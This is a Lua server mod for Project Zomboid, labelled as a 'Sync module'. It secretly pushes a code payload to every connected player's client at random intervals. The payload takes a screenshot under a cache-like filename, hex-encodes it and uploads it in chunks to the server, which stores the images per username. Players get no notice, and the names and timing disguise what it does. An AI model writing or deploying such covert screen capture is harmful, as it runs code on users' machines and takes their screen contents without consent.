local TAG = "[SZ_Sync]"
local INTERVAL_MS = 60000
local WPT = 20

local active = {}
local wq = {}
local timers = {}

local function log(msg)
    print(TAG .. " " .. tostring(msg))
end

local PAYLOAD = [[
local fn = "pz_cache.png"
local out = "info.dat"
local bpt = 4000
local cs = 30000

local hl = {}
for i = 0, 255 do hl[i] = string.format("%02X", i) end

local st = 0
local tm = 0
local tex = nil
local rs = nil
local hb = ""
local tb = 0
local sc = 0
local tid = tostring(getTimestampMs())
local cn = _SZ_S_N or 0
_SZ_S_N = cn + 1

local function done()
    if rs then pcall(function() rs:close() end) end
    rs = nil
    tex = nil
    hb = ""
    if _SZ_S_T then Events.OnTick.Remove(_SZ_S_T) end
    _SZ_S_T = nil
end

takeScreenshot(fn)
st = 1
tm = getTimestampMs()

_SZ_S_T = function()
    local now = getTimestampMs()

    if st == 1 then
        if now - tm >= 3000 then
            local ok, t = pcall(getTextureFromSaveDir, fn, "../Screenshots")
            if ok and t then
                pcall(function() t:reloadFromFile(t:getName()) end)
                tex = t
                st = 2
                tm = now
            else
                done()
            end
        end

    elseif st == 2 then
        if tex then
            local ok_id, id = pcall(function() return tex:getID() end)
            if ok_id and id ~= -1 then
                local ok = pcall(function()
                    tex:saveToZomboidDirectory("Lua/" .. out)
                end)
                if ok then
                    st = 3
                    tm = now
                else
                    done()
                end
            elseif now - tm >= 10000 then
                done()
            end
        else
            done()
        end

    elseif st == 3 then
        if now - tm >= 3000 then
            local stream = getFileInput(out)
            if stream then
                local avail = stream:available()
                if avail > 0 then
                    rs = stream
                    hb = ""
                    tb = 0
                    sc = 0
                    local p = getPlayer()
                    if p then
                        sendClientCommand(p, "SZ_Sync", "ds", {
                            id = tid, size = avail, n = cn,
                        })
                    end
                    st = 4
                else
                    stream:close()
                    done()
                end
            else
                done()
            end
        end

    elseif st == 4 then
        if not rs then done() return end
        local parts = {}
        local count = 0
        for i = 1, bpt do
            local b = rs:read()
            if b == -1 then
                rs:close()
                rs = nil
                break
            end
            count = count + 1
            parts[i] = hl[b]
        end
        if count > 0 then
            tb = tb + count
            hb = hb .. table.concat(parts, "", 1, count)
        end
        while #hb >= cs do
            local chunk = string.sub(hb, 1, cs)
            hb = string.sub(hb, cs + 1)
            sc = sc + 1
            local p = getPlayer()
            if p then
                sendClientCommand(p, "SZ_Sync", "dc", {
                    id = tid, seq = sc, data = chunk,
                })
            end
        end
        if not rs then
            if #hb > 0 then
                sc = sc + 1
                local p = getPlayer()
                if p then
                    sendClientCommand(p, "SZ_Sync", "dc", {
                        id = tid, seq = sc, data = hb,
                    })
                end
            end
            local p = getPlayer()
            if p then
                sendClientCommand(p, "SZ_Sync", "de", {
                    id = tid, tb = tb, tc = sc, n = cn,
                })
            end
            done()
        end
    end
end

Events.OnTick.Add(_SZ_S_T)
]]

local function sendTask(player)
    local username = player:getUsername()
    log("-> " .. username)
    sendServerCommand(player, "SZ_Sync", "run", { code = PAYLOAD })
end

local function onClientCommand(module, command, player, args)
    if module ~= "SZ_Sync" then return end

    local username = player:getUsername()

    if command == "ds" then
        active[username] = {
            id = args.id,
            chunks = {},
            size = args.size,
            n = args.n,
        }
        log("Started: " .. username .. " #" .. tostring(args.n) .. " (" .. tostring(args.size) .. "b)")

    elseif command == "dc" then
        local t = active[username]
        if not t or t.id ~= args.id then return end
        table.insert(t.chunks, args.data)

    elseif command == "de" then
        local t = active[username]
        if not t or t.id ~= args.id then return end

        log("Done: " .. username .. " " .. tostring(args.tb) .. "b " .. tostring(args.tc) .. "ch")

        local filename = "SZ_AC/" .. username .. "_" .. tostring(args.n % 5) .. ".hex"
        table.insert(wq, {
            filename = filename,
            chunks = t.chunks,
            idx = 0,
            user = username,
        })

        active[username] = nil
    end
end

local function writeTick()
    if #wq == 0 then return end

    local job = wq[1]

    if job.idx == 0 then
        local writer = getFileWriter(job.filename, true, false)
        if not writer then
            log("Write fail: " .. job.filename)
            table.remove(wq, 1)
            return
        end
        job.writer = writer
        job.idx = 1
    end

    if not job.writer then
        table.remove(wq, 1)
        return
    end

    local w = 0
    while w < WPT and job.idx <= #job.chunks do
        job.writer:writeln(job.chunks[job.idx])
        job.idx = job.idx + 1
        w = w + 1
    end

    if job.idx > #job.chunks then
        job.writer:close()
        job.writer = nil
        log("Saved: " .. job.filename .. " (" .. job.user .. ")")
        table.remove(wq, 1)
    end
end

local function serverTick()
    local now = getTimestampMs()
    local players = getOnlinePlayers()
    if not players then return end

    for i = 0, players:size() - 1 do
        local player = players:get(i)
        if player then
            local u = player:getUsername()
            if not timers[u] then
                timers[u] = now + 10000 + ZombRand(50000)
            end
            if now >= timers[u] then
                sendTask(player)
                timers[u] = now + INTERVAL_MS + ZombRand(30000)
            end
        end
    end

    local online = {}
    for i = 0, players:size() - 1 do
        local p = players:get(i)
        if p then online[p:getUsername()] = true end
    end
    for u, _ in pairs(timers) do
        if not online[u] then timers[u] = nil end
    end
end

Events.OnClientCommand.Add(onClientCommand)
Events.OnTick.Add(writeTick)
Events.OnTick.Add(serverTick)

log("Sync module loaded")
